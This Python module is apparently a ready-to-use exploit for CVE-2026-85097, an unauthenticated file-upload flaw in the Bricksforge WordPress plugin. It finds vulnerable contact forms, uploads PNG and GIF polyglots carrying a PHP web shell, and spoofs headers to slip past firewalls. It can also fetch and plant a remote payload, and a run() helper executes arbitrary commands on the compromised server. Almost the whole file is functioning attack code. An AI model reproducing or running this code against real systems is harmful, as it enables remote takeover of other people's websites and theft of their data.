# -*- coding: utf-8 -*-
# CVE-2026-85097 — Bricksforge <= 3.1.8.9 unauth arbitrary file upload -> RCE
# Function-only refactor. No side-effects on import. Thread-safe.
# Usage:
#     from function.cve_2026_85097 import exploit, run
#     r = exploit('http://target.com/contact/')
#     if r['exploited']:
#         print(run(r['shell_url'], 'id; uname -a'))
# Coded by @zappy777 — refactored
import json
import random
import re
import string
import time
import urllib.parse
from datetime import datetime, timedelta, timezone

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CVE_ID = 'CVE-2026-85097'
MARKER = 'BF85097_MARKER'
DEFAULT_TIMEOUT = 15
TITLE_RE = re.compile(r"<title>([^<]*)</title>", re.I)

# ────────────── payload constants ──────────────
PNG_1PX = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001080600000"
    "01f15c4890000000d49444154789c6360000002000100" "05fe02fe"
    "dccc59e70000000049454e44ae426082"
)
SHELL_BODY = ('<?php echo "' + MARKER + '";'
              'if(isset($_GET["c"])){system($_GET["c"]);} ?>').encode()

GIF_1PX = bytes.fromhex(
    "474946383961" "01000100" "8000" "000000" "ffffff"
    "2c" "00000000" "01000100" "00" "02" "02" "440100" "3b"
)
GIF_TEXT = (
    b"\x21\xf9\x04\x01\x00\x00\x00\x00"
    b"\x21\xfe"
    + bytes([min(len(SHELL_BODY), 255)]) + SHELL_BODY[:255]
    + b"\x00"
    + b"\x3b"
)

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 Edg/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

WAF_SPOOF_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
]

DISC_PATHS = ["", "contact/", "contact-us/", "kontak/", "hubungi-kami/", "about/",
              "upload/", "careers/", "karir/", "job/", "jobs/", "quote/", "request/",
              "order/", "booking/", "support/", "help/", "apply/", "submit/"]


# ────────────── headers ──────────────
def _hdrs(extra=None, waf=False):
    h = {"User-Agent": random.choice(UAS)}
    if waf:
        for k, v in random.choice(WAF_SPOOF_HEADERS).items():
            h[k] = v
        h.update({
            "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        })
    if extra:
        h.update(extra)
    return h


# ────────────── polyglot builders ──────────────
def _png_text_chunk(keyword, text):
    import struct, zlib
    data = keyword.encode() + b"\x00" + text.encode("latin-1", "replace")
    return (struct.pack(">I", len(data)) + b"tEXt" + data
            + struct.pack(">I", zlib.crc32(b"tEXt" + data) & 0xffffffff))


def _build_polyglots():
    a = PNG_1PX[:-12] + _png_text_chunk("Comment", SHELL_BODY.decode("latin-1")) + PNG_1PX[-12:]
    a = a + SHELL_BODY
    b = PNG_1PX + SHELL_BODY
    ga = GIF_1PX[:-1] + GIF_TEXT
    gb = GIF_1PX + SHELL_BODY
    return [a, b, ga, gb]


def _gif_comment_blob(payload):
    out = bytearray(GIF_1PX[:-1])
    out += b"\x21\xfe"
    for i in range(0, len(payload), 255):
        chunk = payload[i:i + 255]
        out += bytes([len(chunk)]) + chunk
    out += b"\x00\x3b"
    return bytes(out)


def wrap_payload(payload):
    """Wrap an arbitrary payload in polyglot variants that pass finfo."""
    return [
        PNG_1PX + b"\n" + payload,
        _gif_comment_blob(payload),
        GIF_1PX + b"\n" + payload,
        payload,
    ]


def fetch_payload(url, timeout=DEFAULT_TIMEOUT):
    try:
        r = requests.get(url, headers=_hdrs(), timeout=timeout, verify=False)
        if r.status_code == 200 and r.content:
            return r.content
    except Exception:
        pass
    return None


# ────────────── HTTP helpers ──────────────
def _waf_variants():
    base_name = random.choice(["x.png", "photo.jpg", "image.gif", "avatar.webp"])
    yield ("plain", {}, {})
    yield ("benign-name", {"fname": base_name}, {})
    yield ("ct-image", {"fname": base_name, "ctype": "image/png"}, {})
    yield ("waf-headers", {"fname": base_name}, None)


def _waf_retry(wraps):
    last = None
    for label, files_spec, hdr_spec in _waf_variants():
        extra = {}
        if files_spec.get("fname"):
            extra["_fname"] = files_spec["fname"]
        if files_spec.get("ctype"):
            extra["_ctype"] = files_spec["ctype"]
        waf = hdr_spec is None
        try:
            r = wraps(extra, waf)
        except Exception as e:
            last = ("", str(e))
            continue
        last = (label, r)
        if r is not None and r.status_code not in (403, 406, 429, 501, 503):
            return label, r
    return last


# ────────────── form discovery ──────────────
def _parse_forms(html):
    out = []
    blocks = re.split(r'(?=<form\b[^>]*brxe-brf-pro-forms)', html)
    for blk in blocks:
        if "brxe-brf-pro-forms" not in blk:
            continue
        end = blk.find("</form>")
        blk = blk[:end + 7] if end != -1 else blk

        form_m = re.search(r'<form\b[^>]*>', blk)
        form_tag = form_m.group(0) if form_m else ""
        form_id = None
        m = re.search(r'data-script-id="([^"]+)"', form_tag)
        if m:
            form_id = m.group(1)
        else:
            m = re.search(r'\bid="brxe-([^"]+)"', form_tag)
            if m:
                form_id = m.group(1)

        post_m = re.search(r'["\']postId["\']\s*:\s*["\']?(\d+)', blk)
        post_id = post_m.group(1) if post_m else None

        file_names = set(re.findall(
            r'<input[^>]*type="file"[^>]*name="form-field-([^"\[\]]+)', blk))
        file_names |= set(re.findall(
            r'<input[^>]*name="form-field-([^"\[\]]+)[^>]*type="file"', blk))

        el_to_cid = {}
        for tag in re.findall(r"<[^>]*data-custom-id=\"[^\"]*\"[^>]*>", blk):
            cid = re.search(r'data-custom-id="([^"]+)"', tag)
            eid = re.search(r'data-element-id="([^"]+)"', tag)
            if cid and eid:
                el_to_cid[eid.group(1)] = cid.group(1)

        file_containers = re.findall(
            r'data-element-id="([^"]+)"[^>]*class="[^"]*brf-pro-forms-field-file', blk)

        field_id = field_el = None
        for eid in file_containers:
            cid = el_to_cid.get(eid)
            if cid and cid in file_names:
                field_id, field_el = cid, eid
                break
        if not field_id:
            for cid, eid in el_to_cid.items():
                if cid in file_names:
                    field_id, field_el = cid, cid
                    break
        if not field_id and file_names:
            field_id = sorted(file_names)[0]
            field_el = field_id

        any_field = any_field_el = None
        for eid, cid in el_to_cid.items():
            if cid:
                any_field, any_field_el = cid, eid
                break
        if not any_field:
            names = re.findall(r'name="form-field-([^"\[\]]+)', blk)
            if names:
                any_field = any_field_el = names[0]

        if form_id and (field_id or any_field):
            out.append({
                "post_id": post_id, "form_id": form_id,
                "field_id": field_id, "field_el": field_el or form_id,
                "file_names": sorted(file_names),
                "has_file": bool(field_id),
                "any_field": any_field, "any_field_el": any_field_el,
            })
    return out


def discover(sess, url, timeout, extra_paths=None):
    saw_form = False
    fallback = None
    for rel in (extra_paths or DISC_PATHS):
        page = urllib.parse.urljoin(url if url.endswith("/") else url + "/", rel)
        try:
            r = sess.get(page, headers=_hdrs(), timeout=timeout, verify=False)
        except Exception:
            continue
        html = r.text
        if "brf-pro-forms" not in html:
            continue
        saw_form = True
        forms = _parse_forms(html)
        if not forms:
            continue
        with_file = [f for f in forms if f.get("has_file")]
        cand = with_file[0] if with_file else None
        post_id = cand["post_id"] if cand else None
        if not post_id:
            m = re.search(r'["\']postId["\']\s*:\s*["\']?(\d+)', html)
            post_id = m.group(1) if m else None

        if cand and post_id:
            return {
                "page": page, "post_id": post_id, "form_id": cand["form_id"],
                "field_id": cand["field_id"], "field_el": cand["field_el"],
                "mode": "file",
            }, "ok"

        if not fallback and post_id:
            nf = [f for f in forms if f.get("any_field")]
            if nf:
                fallback = {
                    "page": page, "post_id": post_id, "form_id": nf[0]["form_id"],
                    "field_id": nf[0]["any_field"],
                    "field_el": nf[0]["any_field_el"] or nf[0]["form_id"],
                    "mode": "nofile",
                }

    if fallback:
        return fallback, "ok"
    if saw_form:
        return None, "form_no_field"
    return None, "no_form"


# ────────────── exploit stages ──────────────
def get_nonce(sess, root, timeout, retries=2):
    for _ in range(retries):
        try:
            r = sess.post(
                root + "/wp-admin/admin-ajax.php",
                data={"action": "bricksforge_regenerate_nonce"},
                headers=_hdrs(), timeout=timeout, verify=False,
            )
            if r.status_code == 200:
                j = r.json()
                if j.get("success") and j.get("data", {}).get("nonce"):
                    return j["data"]["nonce"]
        except Exception:
            time.sleep(1)
    return None


def upload_polyglot(sess, root, nonce, timeout, payloads=None):
    url = root + "/wp-json/bricksforge/v1/form_file_upload"
    variants = payloads if payloads else _build_polyglots()

    def post_one(u, extra, waf, blob, idx):
        is_gif = blob.startswith(b"GIF8")
        fname = extra.get("_fname") or f"x{idx}.{'gif' if is_gif else 'png'}"
        ctype = extra.get("_ctype") or ("image/gif" if is_gif else "image/png")
        return sess.post(
            u, headers=_hdrs({"X-WP-Nonce": nonce}, waf=waf),
            files={"file[]": (fname, blob, ctype)},
            timeout=timeout, verify=False,
        )

    for u in (url, root + "/?rest_route=/bricksforge/v1/form_file_upload"):
        for idx, blob in enumerate(variants):
            def do(extra, waf, _blob=blob, _idx=idx, _u=u):
                return post_one(_u, extra, waf, _blob, _idx)
            _, r = _waf_retry(do)
            if r is None or not hasattr(r, "json"):
                continue
            try:
                j = r.json()
            except Exception:
                continue
            if j.get("success") and isinstance(j.get("data"), list) and j["data"]:
                return j["data"][0].get("file")
    return None


def submit(sess, root, nonce, info, tmp_path, shell, timeout):
    field_id = info.get("field_id")
    if not field_id:
        return 0, "no field id detected on page"
    tfu = json.dumps([{
        "file": {"file": tmp_path, "url": shell},
        "field": "form-field-" + field_id,
    }])
    url = root + "/wp-json/bricksforge/v1/form_submit"

    def _body():
        b = {
            "postId": str(info["post_id"]),
            "formId": info["form_id"],
            "formIdFallback": info.get("field_el") or info["form_id"],
            "fieldIds": json.dumps({field_id: info.get("field_el") or field_id}),
            "temporaryFileUploads": tfu,
            "action": "bricksforge_form_submit",
        }
        if info.get("mode") == "nofile":
            b["form-field-" + field_id] = "hello"
        return b

    def do(extra, waf):
        return sess.post(url, headers=_hdrs({"X-WP-Nonce": nonce}, waf=waf),
                         data=_body(), timeout=timeout, verify=False)

    try:
        _, r = _waf_retry(do)
        if r is None or not hasattr(r, "status_code"):
            return 0, str(r)
        if r.status_code in (401, 403):
            alt = root + "/?rest_route=/bricksforge/v1/form_submit"

            def do2(extra, waf):
                return sess.post(alt, headers=_hdrs({"X-WP-Nonce": nonce}, waf=waf),
                                 data=_body(), timeout=timeout, verify=False)

            _, r2 = _waf_retry(do2)
            if r2 is not None and hasattr(r2, "status_code"):
                return r2.status_code, r2.text[:400]
        return r.status_code, r.text[:400]
    except Exception as e:
        return 0, str(e)


def _content_bases(root, page):
    bases = [root + "/"]
    try:
        path = urllib.parse.urlsplit(page).path
    except Exception:
        path = "/"
    segs = [s for s in path.split("/") if s]
    for i in range(len(segs), 0, -1):
        bases.append(root + "/" + "/".join(segs[:i]) + "/")
    return list(dict.fromkeys(bases))


def verify(sess, root, page, shell, timeout):
    now = datetime.now(timezone.utc)
    subdirs = [f"{(now + timedelta(days=30 * d)).year}/"
               f"{(now + timedelta(days=30 * d)).month:02d}" for d in (0, 1, -1, 2, -2)]
    subdirs.append("")
    seen, cands = set(), []
    for base in _content_bases(root, page):
        for sd in subdirs:
            rel = f"wp-content/uploads/{sd + '/' if sd else ''}{shell}"
            u = urllib.parse.urljoin(base, rel)
            if u not in seen:
                seen.add(u)
                cands.append(u)
    for u in cands:
        try:
            r = sess.get(u + "?c=id", headers=_hdrs(), timeout=timeout, verify=False)
        except Exception:
            continue
        if r.status_code == 200 and MARKER in r.text and ("uid=" in r.text or "gid=" in r.text):
            return u
    return None


def verify_remote(sess, root, page, shell, timeout):
    now = datetime.now(timezone.utc)
    subdirs = [f"{(now + timedelta(days=30 * d)).year}/"
               f"{(now + timedelta(days=30 * d)).month:02d}" for d in (0, 1, -1, 2, -2)]
    subdirs.append("")
    seen, cands = set(), []
    for base in _content_bases(root, page):
        for sd in subdirs:
            rel = f"wp-content/uploads/{sd + '/' if sd else ''}{shell}"
            u = urllib.parse.urljoin(base, rel)
            if u not in seen:
                seen.add(u)
                cands.append(u)
    for u in cands:
        try:
            r = sess.get(u, headers=_hdrs(), timeout=timeout, verify=False)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        php = "php" in r.headers.get("X-Powered-By", "").lower()
        if php or TITLE_RE.search(r.text) or "<?php" in r.text:
            return u
    return None


def _rand_shell():
    return "bf85097_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6)) + ".php"


# ────────────── public exec helper ──────────────
def run(shell_url, cmd, timeout=DEFAULT_TIMEOUT):
    """Execute command via uploaded shell. Return stripped stdout."""
    try:
        r = requests.get(shell_url, params={"c": cmd},
                         headers=_hdrs(), timeout=timeout, verify=False)
        out = r.text
        i = out.rfind(MARKER)
        if i >= 0:
            out = out[i + len(MARKER):]
        j = out.find(MARKER)
        if j >= 0:
            out = out[:j]
        return out.replace("\x00", "").strip()
    except Exception as e:
        return f"<cmd error: {e}>"


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, payload_url=None, post_id=None, form_id=None,
            field_id=None, field_el=None, extra_paths=None,
            debug=False, timeout=DEFAULT_TIMEOUT):
    """
    Exploit CVE-2026-85097 (Bricksforge <= 3.1.8.9 unauth file upload).

    Args:
        target_url   : str  — 'http://x.com', 'x.com', 'http://x.com/contact/'
        payload_url  : str  — optional remote shell to wrap+upload (name from URL)
        post_id      : str  — manual override (skip discovery)
        form_id      : str  — manual override
        field_id     : str  — manual override
        field_el     : str  — manual override
        extra_paths  : list — extra pages to probe for Bricksforge forms
        debug        : bool — collect step log into result['log']
        timeout      : int  — per-request timeout

    Returns:
        dict — standard contract. 'exploited' = True only when shell is
        uploaded AND verified exec (own marker or remote title/php).
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'not detected',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': MARKER,
        'detail': '',
        'exploited': False,
        'log': [],
        'form_page': None,
        'form_mode': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    # normalize
    t = target_url.strip()
    if not t:
        res['detail'] = 'empty target'
        return res
    if '://' not in t:
        t = 'http://' + t
    parts = urllib.parse.urlsplit(t)
    root = f"{parts.scheme}://{parts.netloc}"
    res['target'] = t

    sess = requests.Session()
    try:
        # discovery / manual
        if post_id and form_id and field_id:
            info = {
                'page': t, 'post_id': post_id, 'form_id': form_id,
                'field_id': field_id, 'field_el': field_el or form_id,
                'mode': 'file',
            }
            reason = 'ok'
            _step('using manual form params')
        else:
            info, reason = discover(sess, t, timeout, extra_paths)
        if not info:
            res['detail'] = ('no usable field on Bricksforge form'
                             if reason == 'form_no_field'
                             else 'no Bricksforge Pro Form found')
            return res

        res['plugin'] = 'detected'
        res['form_page'] = info['page']
        res['form_mode'] = info['mode']
        _step('form: ' + info['page'] + ' (mode=' + info['mode'] + ')')

        # nonce
        nonce = get_nonce(sess, root, timeout)
        if not nonce:
            res['detail'] = 'bricksforge not loaded (nonce endpoint dead)'
            return res
        _step('nonce acquired')

        # payload variants
        payloads = None
        remote_name = None
        if payload_url:
            body = fetch_payload(payload_url, timeout)
            if not body:
                res['detail'] = 'could not download payload from ' + payload_url
                return res
            payloads = wrap_payload(body)
            remote_name = urllib.parse.urlsplit(payload_url).path.rsplit('/', 1)[-1] or 'sh.php'
            _step('wrapped remote payload as ' + remote_name)

        # upload
        tmp = upload_polyglot(sess, root, nonce, timeout, payloads)
        if not tmp:
            res['detail'] = 'form_file_upload rejected (WAF or plugin gate)'
            return res
        res['vulnerable'] = True
        _step('uploaded to tmp path: ' + str(tmp))

        # submit
        shell = remote_name or _rand_shell()
        st, txt = submit(sess, root, nonce, info, tmp, shell, timeout)
        res['endpoint'] = root + '/wp-json/bricksforge/v1/form_submit'
        res['http_status'] = st if st else None
        _step(f'submit -> HTTP {st}')

        # verify
        if remote_name:
            shell_url = verify_remote(sess, root, info['page'], shell, timeout)
        else:
            shell_url = verify(sess, root, info['page'], shell, timeout)
        if not shell_url:
            res['detail'] = f'submit st={st} resp={txt[:120]}'
            return res

        res['shell_url'] = shell_url
        res['rce_verified'] = 'YES'
        res['exploited'] = True
        res['detail'] = 'upload+execute verified via ' + info['page']
        _step('shell: ' + shell_url)

        # first evidence: id
        try:
            out = run(shell_url, 'id', timeout)
            if out and 'uid=' in out:
                res['output'] = out[:300]
        except Exception:
            pass
        return res
    except Exception as e:
        res['detail'] = 'unhandled: ' + str(e)[:150]
        return res
    finally:
        sess.close()